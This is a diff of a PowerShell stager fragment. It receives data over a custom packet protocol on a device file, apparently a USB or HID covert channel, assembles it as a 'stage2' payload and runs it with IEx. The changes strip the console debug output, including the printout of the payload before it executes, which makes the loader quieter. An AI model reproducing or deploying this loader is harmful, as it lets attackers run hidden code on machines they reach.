@@ -61,14 +61,12 @@ try
       $b = New-Object Byte[]($packetSize+1)
       $b[1] = sa $txSeq $rxSeq
       $b[3] = $flag
-      # [Console]::WriteLine("TX("+$line+"): " + [System.BitConverter]::ToString($b))
       $devfile.Write($b, 0, $packetSize+1)
   
       $txSeq=($txSeq+1) -band 0x0F
       if ($flag -eq 6) {break} # We've sent the FIN/ACK
   
       $r = $devfile.Read($b, 0, $packetSize+1)
-      # [Console]::WriteLine("RX("+$line+"): " + [System.BitConverter]::ToString($b))
       $rxSeq = (bs $b[1] -4) -band 0xF
       $rxAck = $b[1] -band 0x0F
       $ch = $b[2]
@@ -78,37 +76,29 @@ try
       if (($lastRxSeq -eq 0xFF) -or ($rxSeq -eq (($lastRxSeq+1) -band 0x0F))) {
         $lastRxSeq = $rxSeq
       } else {
-        [Console]::WriteLine("Bad RX Seq, expected " + (($lastRxSeq+1) -band 0x0F) +", got " + $rxSeq)
       }
       if (($rxAck -eq $lastRxAck) -or ($rxAck -eq (($lastRxAck+1) -band 0x0F))) {
         $lastRxAck = $rxAck
       } else {
-        [Console]::WriteLine("Bad RX Ack, expected " + (($lastRxAck+1) -band 0x0F) +", got " + $rxAck)
       }
 
       if ($ch -eq 0) { # channel 0
         if ($rxFlags -eq 0) { # no flags, empty ACK of SEQ
-          # do nothing
         } elseif ($rxFlags -band 4) {  # FIN or FIN|ACK
-          [Console]::WriteLine("Closing!")
           $flag = 6               # FIN/ACK
         } elseif ($rxFlags -band 2) {  # SYN/ACK or ACK
           if ($rxLength -gt 0) {
             $d.Write($b,5,$rxLength)
-            # [Console]::Write(([Text.Encoding]::ASCII).GetString($b[5..(5+$rxLength)]))
           }
           $flag = 2               # ACK
         } else {
-          [Console]::WriteLine("Got an unknown packet!? Starting again")
           $d = New-Object IO.MemoryStream
           $flag = 1 # SYN
         }
       }
     }
-    [Console]::WriteLine("Out of main loop")
     if ($d -ne $null) {
       $stage2 = ([Text.Encoding]::ASCII).GetString($d.ToArray())
-      [Console]::WriteLine($stage2)
       Start-Sleep -Seconds 5
       IEx $stage2
     }
